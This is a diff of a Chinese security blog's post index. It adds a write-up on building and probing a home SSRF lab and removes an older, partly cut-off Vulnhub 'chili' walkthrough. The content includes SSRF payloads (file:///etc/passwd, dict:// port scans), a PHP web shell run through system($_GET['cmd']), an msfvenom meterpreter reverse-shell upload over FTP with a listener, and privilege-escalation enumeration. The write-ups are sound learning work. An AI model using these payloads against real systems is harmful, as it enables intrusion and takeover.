@@ -422,6 +422,135 @@
       </tags>
   </entry>
   <entry>
+    <title>内网场景搭建</title>
+    <url>/2024/02/02/%E6%90%AD%E5%BB%BA-ssrf/</url>
+    <content><![CDATA[<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>为了更好地熟悉ssrf</p>
+<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>根据<a href="https://github.com/sqlsec/ssrf-vuls/tree/main%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91%E5%9B%BE%E6%90%AD%E5%BB%BA">https://github.com/sqlsec/ssrf-vuls/tree/main的靶场拓扑图搭建</a></p>
+<p>搭建需求：目标机存在ssrf漏洞，有一个公网映射80:8080，而与目标机同局域网下的其它内网有各自的漏洞</p>
+<h1 id="搭建思路"><a href="#搭建思路" class="headerlink" title="搭建思路"></a>搭建思路</h1><p>由于电脑配置原因，我这里选择只搞两个虚拟机，一个为目标机，另一个作为可替换的局域网机</p>
+<h2 id="问题：对目标机如何进行端口映射"><a href="#问题：对目标机如何进行端口映射" class="headerlink" title="问题：对目标机如何进行端口映射"></a>问题：对目标机如何进行端口映射</h2><p><strong>思路1：</strong></p>
+<p>常见的端口映射需要用到路由器的端口转发功能；</p>
+<p>虚拟机这里，emmm多加张网卡</p>
+<p>首先配置内部局域网网段</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240202124820733.png"></p>
+<p>对于目标机而言，第一块网卡，选VMnet3(172.x)，第二块网卡选桥接(作为外网192.x，即与攻击机同网段)</p>
+<p>接下来是尝试将<strong>172.x:80到192.x:8080</strong></p>
+<p>因为一般来讲的端口映射，貌似都是单ip的多端口映射</p>
+<p>所以这里缺一个方法，使得双ip之间映射</p>
+<p>端口映射有三种情况嘛：1.动态公网IP(DDNS)；2.内网穿透(无公网IP)；3.直接绑定(有固定公网IP)</p>
+<p><strong>思路2：</strong></p>
+<p>这里考虑<strong>内网穿透</strong></p>
+<p>因为考虑到目标机既能被外网访问，又做了个端口映射。</p>
+<p>这个目标机我可以由两个机子组成，内网A，外网B；用<strong>proxychains</strong>或者其它**内网穿透工具(frp、nat123)**将这两个机器(网卡)映射一下即可；这样就是访问B的8080端口，就相当于访问了A的80端口的目的了；当然更通俗地理解，可以买个vps直接当公网</p>
+<p><strong>思路3</strong>：</p>
+<p>有没有一种可能，思路2也是思路1的解决方案之一呢？</p>
+<p>为了解决思路1的问题，</p>
+<p><strong>iptables</strong>可以配置一下</p>
+<p>那中间件<strong>nginx</strong>配置一下</p>
+<p><strong>apache</strong>是否可以配置一下呢</p>
+<h1 id="ip设置"><a href="#ip设置" class="headerlink" title="ip设置"></a>ip设置</h1><p>在那之前，把配置搞好，我centos的两个网卡有问题，需要手动配置一遍</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/sysconfig/network-scripts/</span><br><span class="line">#将ifcfg-*的设置一下，我为了方便，用dhcp模式，不静态了，因为两张网卡我有点分不清哪个是外网内网，让它自己分配</span><br></pre></td></tr></table></figure>
+
+<p>最终配置如下：(centos可以ping通<a href="http://www.baidu即可/">www.baidu即可</a>)</p>
+<table>
+<thead>
+<tr>
+<th>机器</th>
+<th>内网</th>
+<th>外网</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>目标机</td>
+<td>172.72.23.21</td>
+<td>192.168.1.99</td>
+</tr>
+<tr>
+<td>攻击机</td>
+<td></td>
+<td>192.168.1.142</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>我之前装过<strong>xampp</strong>的，然后物理机访问一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.99/dashboard/ #出现xampp默认页面，没问题</span><br><span class="line">靶机呢，自己用内网ip访问也没问题</span><br></pre></td></tr></table></figure>
+
+<p>但是呢，要搞成如下效果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.99:8080 ，实则是访问 http://172.72.23.21</span><br></pre></td></tr></table></figure>
+
+<p>这里还牵扯到apache配置，慢慢来，(nginx代理会不会更好一点)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/lampp/apache2/conf/httpd.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#sudo /opt/lampp/lampp restartapache</span><br><span class="line">sudo /opt/lampp/bin/apachectl restart</span><br></pre></td></tr></table></figure>
+
+<p>iptables实现一个NAT转发功能</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/net/ipv4/ip_forward #不需要</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#iptables使用示例</span></span><br><span class="line">PREROUTING 链中的规则可以用于修改数据包的目标地址（Destination Address），进行端口转发（Port Forwarding）等操作。</span><br><span class="line">iptables -t nat -A PREROUTING -d 172.72.23.21 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.99:8080</span><br><span class="line"></span><br><span class="line">iptables -t nat -D PREROUTING -p tcp --dport 80 -d 172.72.23.21 -j DNAT --to-destination 192.168.1.99:8080</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING -d 192.168.1.99 -p tcp --dport 8080 -j SNAT --to 172.72.23.21</span><br><span class="line"></span><br><span class="line">iptables -t nat -D POSTROUTING -d 192.168.1.99 -p tcp --dport 8080 -j SNAT --to 172.72.23.21</span><br><span class="line"></span><br><span class="line"><span class="comment">#临时保存</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp -d 192.168.1.99 --dport 8080 -j DNAT --to-destination 172.72.23.21:80</span><br><span class="line">将去往 IP 地址为 192.168.1.99、目标端口为 8080 的 TCP 流量进行目标地址转换 (DNAT)，将其转发到 IP 地址为 172.72.23.21 的目标服务器的端口 80。</span><br><span class="line"></span><br><span class="line">iptables -t nat -D PREROUTING -p tcp -d 192.168.1.99 --dport 8080 -j DNAT --to-destination 172.72.23.21:80</span><br><span class="line"></span><br><span class="line">sudo iptables -t nat -L -n</span><br><span class="line">iptables -nvL --line-number</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">DNAT       tcp  --  192.168.1.99         0.0.0.0/0            tcp dpt:8080 to:172.72.23.21:80</span><br><span class="line"></span><br><span class="line"><span class="comment">#开放端口</span></span><br><span class="line">iptables -A INPUT -p tcp -d 192.168.1.0/24 --dport 8080 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -d 192.168.1.0/24 --dport 80 -j DROP</span><br></pre></td></tr></table></figure>
+
+<p>搞了半天，xampp的配置文件，在**&#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf**里，虽然该文件可以包含apache2&#x2F;httpd.conf的内容，但是配置不当会冲突，比如导致权限问题</p>
+<p>分析一下，首先，该文件监听80端口的，不考虑iptables的情况下，任何主机对两个ip的访问都是从80端口进入的；如果要实现对ip2的8080端口访问，那就可以Listen ip:8080，但这样不符合公网的端口映射思想；</p>
+<p>对配置文件进行，Require ip 172.x&#x2F;24的话，是限制了来源ip的访问；我的目的是将对目标ip2:8080的访问，转移到ip1:80；这一点iptables已经做到了；</p>
+<p>剩下的是只允许访问192.168.1.99的8080端口，那就是iptables做个drop即可吧</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -d 192.168.1.0/24 --dport 8080 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -d 192.168.1.0/24 --dport 80 -j DROP</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp -d 192.168.1.99 --dport 8080 -j DNAT --to-destination 172.72.23.21:80</span><br><span class="line"></span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">/opt/lampp/etc/httpd.conf 更改位置</span><br><span class="line">/home/aaa/web/172.72.23.22-CodeExec</span><br><span class="line">/home/xg/web/172.72.23.22-CodeExec</span><br><span class="line">/home/xg/ssrf-vuls-main/172.72.23.21-SSRF</span><br><span class="line"></span><br><span class="line">sudo /opt/lampp/lampp restartapache</span><br></pre></td></tr></table></figure>
+
+<h1 id="一、ssrf"><a href="#一、ssrf" class="headerlink" title="一、ssrf"></a>一、ssrf</h1><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240207171235451.png" alt="公网页面"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240207174453876.png" alt="内网站点"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file:///etc/passwd <span class="comment">#是有东西出来的</span></span><br><span class="line"></span><br><span class="line">抓包是这样的：有个url参数</span><br><span class="line">url=http%3A%2F%2F127.0.0.1%2Fdashboard</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dict/http协议爆破端口</span></span><br><span class="line">dict://127.0.0.1:22 <span class="comment">#得到22端口信息</span></span><br><span class="line">SSH-2.0-OpenSSH_7.4</span><br><span class="line">Protocol mismatch.</span><br><span class="line"></span><br><span class="line">dict://127.0.0.1:80</span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line"></span><br><span class="line"><span class="comment">#http内网文件探测</span></span><br><span class="line">http://127.0.0.1/dashboard/ <span class="comment">#显示内容为xampp默认文件内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#内网段探测</span></span><br><span class="line">file:///etc/hosts <span class="comment">#一般是会显示配置的网段信息的，我这里没配，只有127.0.0.1，假设已知172.72.23.21了</span></span><br></pre></td></tr></table></figure>
+
+<p>进一步利用，继续用dict协议，爆破C段和端口(可以用到bp)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dict://172.72.23.?:? 用bp遍历即可</span><br><span class="line">dict://172.72.23.22:80 <span class="comment">#报错400</span></span><br><span class="line">http://172.72.23.22:80 <span class="comment">#是访问到了22的原内容的</span></span><br><span class="line">Hello CodeExec</span><br><span class="line">可以进一步扫描php文件，这个内容是一个代码执行的网站，即shell.php</span><br><span class="line"></span><br><span class="line">http://172.72.23.22:80/shell.php <span class="comment">#比如扫到了一个文件，可以看它的参数</span></span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">http://172.72.23.22:80/shell.php?cmd=<span class="built_in">ls</span></span><br><span class="line">http://172.72.23.22:80/shell.php?cmd=<span class="built_in">cat</span>%09flag</span><br></pre></td></tr></table></figure>
+
+<p>其它的就类推下去了</p>
+<p>在这里主要是熟悉一下传说中的gopher协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在网页中</span><br><span class="line">http://192.168.1.142:1332/abc</span><br><span class="line">在nc.py文件中</span><br><span class="line">PS E:\VS project\py&gt; python nhash.py -l 1332</span><br><span class="line">[ncat]# whoami</span><br><span class="line">GET /abc HTTP/1.1       </span><br><span class="line">Host: 192.168.1.142:1332</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
+
+<p>我电脑卡死了，接下来口嗨</p>
+<p>gopher以后再用，参考下面的链接，貌似是用来打redis、mysql的</p>
+<p><a href="http://t.csdnimg.cn/bnmnl">http://t.csdnimg.cn/bnmnl</a></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>端口映射 <a href="https://blog.csdn.net/suswulongyuan/article/details/106737145">https://blog.csdn.net/suswulongyuan/article/details/106737145</a></p>
+<p>iptables端口映射 <a href="http://t.csdnimg.cn/QNnrB">http://t.csdnimg.cn/QNnrB</a></p>
+<p>centos7 ip配置 <a href="http://t.csdnimg.cn/OTJLY">http://t.csdnimg.cn/OTJLY</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/sysconfig/network-scripts/</span><br><span class="line"></span><br><span class="line">ip addr</span><br><span class="line"></span><br><span class="line">service network restart	# 重启网络服务</span><br></pre></td></tr></table></figure>
+
+<p>vm添加网卡，但centos并无该文件 <a href="http://t.csdnimg.cn/aIYwb">http://t.csdnimg.cn/aIYwb</a></p>
+<blockquote>
+<p>nmtui命令进行添加</p>
+<p>nmcli con show</p>
+</blockquote>
+<p>centos桥接上不了网：<a href="http://t.csdnimg.cn/O49a6">http://t.csdnimg.cn/O49a6</a></p>
+<blockquote>
+<p>vmet0选定桥接网卡</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XAMPP: Stopping Apache...fail.</span><br><span class="line">考虑是本机有一个apache占用了</span><br><span class="line">或者是 Listen 和&lt;Virtualhost&gt;的冲突</span><br></pre></td></tr></table></figure>
+
+<p>内外网iptables <a href="https://blog.csdn.net/boyemachao/article/details/107059329">https://blog.csdn.net/boyemachao/article/details/107059329</a></p>
+<p>iptables 操作手册 <a href="https://blog.csdn.net/weixin_35642637/article/details/112617332">https://blog.csdn.net/weixin_35642637/article/details/112617332</a></p>
+<p><a href="http://t.csdnimg.cn/J7fuu">http://t.csdnimg.cn/J7fuu</a></p>
+<p>克隆虚拟机引起的冲突问题 <a href="http://t.csdnimg.cn/HpqPF">http://t.csdnimg.cn/HpqPF</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关掉方法:</span><br><span class="line"></span><br><span class="line">systemctl stop NetworkManager</span><br><span class="line"></span><br><span class="line">systemctl disable NetworkManager</span><br><span class="line"></span><br><span class="line">重新启动网络：</span><br><span class="line"></span><br><span class="line">systemctl start network.service</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><p><strong>1.没配置前，物理机可以通过ip访问到xampp内容；配置后，403页面了</strong></p>
+<p>在这里的配置我只用了<code>apache2/conf/httpd.conf</code>，物理机是可以ping通虚拟机的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/apachectl restart</span><br><span class="line">xampp重启</span><br><span class="line">...</span><br><span class="line">我笑了，我挂了代理；但显示访问被拒绝</span><br><span class="line">iptables开放80端口；不行</span><br><span class="line">systemctl stop firewalld；显示响应时间过长 #sudo systemctl stop firewalld重新启用</span><br><span class="line">哦，xampp服务没有启用，6</span><br><span class="line">好好好，apache2/conf/httpd.conf配置有问题(虽然我没看出来，我把内容全部注释掉了)，和/opt/lampp/etc/httpd.conf冲突了</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>配置前没意识到的问题都不算问题，只有在配置的后，再简单的东西也会出错，嘶，多实践，多想，多思考为什么；</p>
+<p>学到搭配这个东西就很好了，其它的都是基础知识，对ssrf进行内网探测更熟练一点</p>
+<p>端口探测-&gt;http协议尝试访问-&gt;尝试访问其它内网ip，目录扫描等-&gt;以便寻找薄弱点</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>ssrf</tag>
+        <tag>内网</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>新技巧学习</title>
     <url>/2024/01/03/%E4%B8%80%E7%82%B9%E6%96%B0%E6%8A%80%E5%B7%A7/</url>
     <content><![CDATA[<p>题外话：很久没更新了，其实也在思考，这条路究竟适不适合我，我也很羡慕那些大佬，src排名啊，cnvd证书个数啊，但是他们想必也付出了很多，无数个日日夜夜，我还是继续吧，走一步看一步了。</p>
@@ -4856,7 +4985,7 @@
 <p>f12扫一眼它的源代码，还有js</p>
 <p>看它的网页功能，主要关注有搜索框和登录入口</p>
 <p>登录可以创建账户，先创建一个</p>
-<p>admin111&#x2F;test&#x2F;test123用户被用过，<a href="mailto:&#49;&#x32;&#x33;&#52;&#x35;&#54;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#49;&#x32;&#x33;&#52;&#x35;&#54;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;</a>被用过</p>
+<p>admin111&#x2F;test&#x2F;test123用户被用过，<a href="mailto:&#x31;&#x32;&#x33;&#x34;&#x35;&#54;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#x31;&#x32;&#x33;&#x34;&#x35;&#54;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;</a>被用过</p>
 <p>test123qwe，进入，有填写基本信息，有上传图片功能</p>
 <p>有一个报错</p>
 <p><img src="/../../../Typora/img111/image-20231117111539091.png"></p>
@@ -13201,155 +13330,6 @@
       </tags>
   </entry>
   <entry>
-    <title>vulnhub</title>
-    <url>/2023/06/30/vulnhub/</url>
-    <content><![CDATA[<h1 id="一、easy"><a href="#一、easy" class="headerlink" title="一、easy"></a>一、easy</h1><h2 id="1-chili-ftp-监听"><a href="#1-chili-ftp-监听" class="headerlink" title="1.chili(ftp+监听)"></a>1.chili(ftp+监听)</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p><code>netdiscover</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620204515392.png"></p>
-<p>ip为192.168.1.4</p>
-<h3 id="2-扫描端口"><a href="#2-扫描端口" class="headerlink" title="2.扫描端口"></a>2.扫描端口</h3><p><code>nmap -Pn 192.168.1.4</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620204816839.png"></p>
-<p>21端口和80端口</p>
-<p>再详细点</p>
-<p><code>nmap -p21,80 -Pn -sV -sS -A -n 192.168.1.4</code>                                           </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p21,80 -Pn -sV -sS -A -n 192.168.1.4</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 20:50 CST</span><br><span class="line">Nmap scan report for 192.168.1.4</span><br><span class="line">Host is up (0.00073s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Chili</span><br><span class="line">MAC Address: 00:0C:29:FE:75:B5 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.73 ms 192.168.1.4</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-访问80端口"><a href="#3-访问80端口" class="headerlink" title="3.访问80端口"></a>3.访问80端口</h3><p>一个小辣椒图片。</p>
-<p>f12，网页源代码，发现有一些单词提示</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620210231238.png"></p>
-<p>cewl工具爬取</p>
-<blockquote>
-<p>┌──(root㉿kali)-[~]</p>
-<p>└─# cewl <a href="http://192.168.1.4/">http://192.168.1.4</a> &gt;user.txt</p>
-<p>┌──(root㉿kali)-[~]<br>└─# cat user.txt<br>Chili<br>Are<br>Still<br>Alive</p>
-</blockquote>
-<p>当然还要将该文件的单词，大写复写，小写复写一遍。</p>
-<p>打开msf工具准备ftp弱口令爆破。</p>
-<blockquote>
-<p>-<strong>msfconsole</strong></p>
-<p>-show auxiliary</p>
-<p>-search ftp_login</p>
-<p>-use 0</p>
-<p>-show options</p>
-<p>…</p>
-</blockquote>
-<blockquote>
-<p>-set rhosts 192.168.1.4</p>
-<p>-set user_file user.txt</p>
-<p>-set pass_file password.txt</p>
-</blockquote>
-<blockquote>
-<p>-exploit</p>
-</blockquote>
-<p>当然，我没爆破出来，字典不行。</p>
-<p>看wp得，密码为a1b2c3d4</p>
-<h3 id="4-ftp连接"><a href="#4-ftp连接" class="headerlink" title="4.ftp连接"></a>4.ftp连接</h3><blockquote>
-<p>└─# ftp 192.168.1.4<br>Connected to 192.168.1.4.<br>220 (vsFTPd 3.0.3)<br>Name (192.168.1.4:root): chili<br>331 Please specify the password.<br>Password:<br>230 Login successful.<br>Remote system type is UNIX.<br>Using binary mode to transfer files.</p>
-</blockquote>
-<blockquote>
-<p>ftp&gt;pwd</p>
-<p>…</p>
-<p>经过一系列尝试，访问进网站根目录。</p>
-<p>ftp&gt; cd var&#x2F;www&#x2F;html<br>250 Directory successfully changed.<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||5328|)<br>150 Here comes the directory listing.<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 .<br>drwxr-xr-x    3 0        0            4096 Sep 08  2020 ..<br>drwxrwxrwx    2 0        0            4096 Sep 08  2020 .nano<br>drwxr-xr-x    2 0        0            4096 Sep 08  2020 .vim<br>-rw-r–r–    1 0        0           74290 Oct 23  2018 Chile_WEB.jpg<br>-rw-r–r–    1 0        0             657 Sep 08  2020 index.html</p>
-</blockquote>
-<p>根据常识</p>
-<blockquote>
-<ul>
-<li><code>d</code> 表示文件夹（目录）</li>
-<li><code>r</code> 表示具有读取权限</li>
-<li><code>w</code> 表示具有写入权限</li>
-<li><code>x</code> 表示具有执行权限</li>
-<li><code>-</code> 表示没有相应的权限</li>
-</ul>
-</blockquote>
-<p> <strong>.nano是一个文件夹，且用户对该目录有读写权限</strong></p>
-<p>考虑上传木马</p>
-<h3 id="5-上传木马"><a href="#5-上传木马" class="headerlink" title="5.上传木马"></a>5.上传木马</h3><blockquote>
-<p>└─# msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;<strong>kali的ip</strong> LPORT&#x3D;4444 -f raw  &gt; shell.php<br>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload<br>[-] No arch selected, selecting arch: php from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 34852 bytes</p>
-</blockquote>
-<blockquote>
-<p>ftp&gt; cd .nano   &#x2F;&#x2F;切换进文件夹<br>250 Directory successfully changed.<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||36678|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Sep 08  2020 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rw-r–r–    1 1000     1000            0 Sep 08  2020 index.html<br>226 Directory send OK.</p>
-</blockquote>
-<blockquote>
-<p>ftp&gt; put shell.php  &#x2F;&#x2F;放置木马<br>local: shell.php remote: shell.php<br>229 Entering Extended Passive Mode (|||14637|)<br>150 Ok to send data.<br>100% |********************************| 34852       15.08 MiB&#x2F;s    00:00 ETA<br>226 Transfer complete.<br>34852 bytes sent in 00:00 (5.13 MiB&#x2F;s)<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||41969|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Jun 20 09:58 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rw-r–r–    1 1000     1000            0 Sep 08  2020 index.html<br>-rw——-    1 1000     1000        34852 Jun 20 09:58 shell.php  &#x2F;&#x2F;上传成功<br>226 Directory send OK.</p>
-</blockquote>
-<blockquote>
-<p>ftp&gt; chmod 777 shell.php   &#x2F;&#x2F;改权限<br>200 SITE CHMOD command ok.<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||26075|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Jun 20 09:58 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rw-r–r–    1 1000     1000            0 Sep 08  2020 index.html<br>-rwxrwxrwx    1 1000     1000        34852 Jun 20 09:58 shell.php</p>
-</blockquote>
-<h3 id="6-msf反弹shell"><a href="#6-msf反弹shell" class="headerlink" title="6.msf反弹shell"></a>6.msf反弹shell</h3><p>监听端口。</p>
-<blockquote>
-<p>msf6 &gt; use exploit&#x2F;multi&#x2F;handler<br>[*] Using configured payload generic&#x2F;shell_reverse_tcp<br>msf6 exploit(multi&#x2F;handler) &gt; set patload php&#x2F;meterpreter_reverse_tcp<br>[-] Unknown datastore option: patload. Did you mean PAYLOAD?<br>msf6 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter_reverse_tcp<br>payload &#x3D;&gt; php&#x2F;meterpreter_reverse_tcp<br>msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.1.4<br>lhost &#x3D;&gt; 192.168.1.4<br>msf6 exploit(multi&#x2F;handler) &gt; exploit</p>
-<p>[-] Handler failed to bind to 192.168.1.4:4444:-  -<br>[*] Started reverse TCP handler on 0.0.0.0:4444 </p>
-</blockquote>
-<p><code>use exploit/multi/handler</code>用于创建一个多功能的处理器，用于<strong>接收和处理</strong>来自<strong>漏洞利用的连接</strong>。</p>
-<p>使用 <code>use exploit/multi/handler</code> 命令后，可以设置一些参数，例如<strong>监听的IP地址、监听的端口、Payload（有效载荷）</strong>等。这样设置后，当成功利用一个漏洞并建立起连接时，多功能处理器将接收到连接并执行预定义的操作，例如获取 shell 或者执行其他命令。</p>
-<p>然后浏览器访问<a href="http://192.168.1.4/.nano/shell.php">http://192.168.1.4/.nano/shell.php</a></p>
-<blockquote>
-<p>meterpreter &gt; getuid<br>Server username: www-data  监听到了。</p>
-</blockquote>
-<p>当然了 nc也行 <code>nc -lvnp 4444</code></p>
-<blockquote>
-<p>起一个 nc 监听，访问 <code>http://192.168.1.4/.nano/php-reverse-shell.php</code>，成功接收到反弹的 shell，并执行命令 <code>SHELL=/bin/bash script -q /dev/null</code> 获得一个交互式 shell</p>
-</blockquote>
-<p>我试了不行诶。</p>
-<p> 遇到反弹后不是正常的shell，可用命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>转化为常规的shell。</p>
-<h3 id="7-提权"><a href="#7-提权" class="headerlink" title="7.提权"></a>7.提权</h3><p>查找用户可读可写、可执行文件、SUID文件</p>
-<p>&#x2F;etc&#x2F;passwd可写，可以写入具有root权限的用户</p>
-<blockquote>
-<p>工具 enumy64：是一款linux后渗透提权枚举工具，是一个快速的可移植、可执行文件 <a href="https://github.com/luke-goddard/enumy/releases">Releases · luke-goddard&#x2F;enumy (github.com)</a></p>
-</blockquote>
-<p>上传该工具</p>
-<blockquote>
-<p>ftp&gt; put enumy64<br>local: enumy64 remote: enumy64<br>229 Entering Extended Passive Mode (|||47003|)<br>150 Ok to send data.<br>100% |********************************|   986 KiB   28.25 MiB&#x2F;s    00:00 ETA<br>226 Transfer complete.<br>1010192 bytes sent in 00:00 (26.89 MiB&#x2F;s)<br>ftp&gt; chmod 777 enumy64    &#x2F;&#x2F;更改工具权限<br>200 SITE CHMOD command ok.<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||28394|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Jun 20 10:19 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rwxrwxrwx    1 1000     1000      1010192 Jun 20 10:19 enumy64<br>-rw-r–r–    1 1000     1000            0 Sep 08  2020 index.html<br>-rwxrwxrwx    1 1000     1000        34852 Jun 20 09:58 shell.php<br>226 Directory send OK.</p>
-</blockquote>
-<p><strong>在监听窗口处执行脚本</strong></p>
-<blockquote>
-<h1 id="meterpreter-gt-ls-laListing-x2F-var-x2F-www-x2F-html-x2F-nano"><a href="#meterpreter-gt-ls-laListing-x2F-var-x2F-www-x2F-html-x2F-nano" class="headerlink" title="meterpreter &gt; ls -laListing: &#x2F;var&#x2F;www&#x2F;html&#x2F;.nano"></a>meterpreter &gt; ls -la<br>Listing: &#x2F;var&#x2F;www&#x2F;html&#x2F;.nano</h1><p>Mode              Size     Type  Last modified              Name</p>
-<hr>
-<p>100777&#x2F;rwxrwxrwx  1010192  fil   2023-06-20 22:19:53 +0800  enumy64<br>100644&#x2F;rw-r–r–  0        fil   2020-09-09 01:14:15 +0800  index.html<br>100777&#x2F;rwxrwxrwx  34852    fil   2023-06-20 21:58:11 +0800  shell.php</p>
-<p>meterpreter &gt; .&#x2F;enumy64<br>[-] Unknown command: .&#x2F;enumy64<br>meterpreter &gt; <strong>shell</strong><br>Process 1147 created.<br>Channel 0 created.<br><strong>pwd</strong><br>&#x2F;var&#x2F;www&#x2F;html&#x2F;.nano<br><strong>.&#x2F;enumy64</strong></p>
-</blockquote>
-<blockquote>
-<p>Current User Info    uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<br>Version              Linux version 4.19.0-10-amd64 (debian-kernel @ lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)<br>hostname             chili<br>Umask                u&#x3D;rwx,g&#x3D;rx,o&#x3D;rx</p>
-<h2 id="Last-Login"><a href="#Last-Login" class="headerlink" title="Last Login"></a>Last Login</h2><p>Username         Port     From             Latest<br>root             tty1                      Tue Sep  8 13:11:53 -0400 2020<br>chili            tty1                      Tue Sep  8 13:12:50 -0400 2020</p>
